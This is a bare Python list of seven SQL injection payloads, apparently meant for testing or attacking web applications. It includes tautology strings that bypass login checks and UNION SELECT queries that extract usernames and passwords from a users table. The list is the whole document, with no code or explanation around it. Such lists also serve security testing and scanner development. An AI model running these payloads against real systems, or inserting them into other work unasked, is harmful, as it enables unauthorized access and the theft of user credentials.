sqli_payloads = [
    "' OR '1'='1",
    "' OR '1'='1' --",
    "' OR '1'='1' /*",
    "' UNION SELECT NULL, username, password FROM users --",
    "' OR 'a'='a",
    "' AND 1=2 UNION SELECT NULL, username, password FROM users --",
    "' OR EXISTS(SELECT * FROM users) --"
]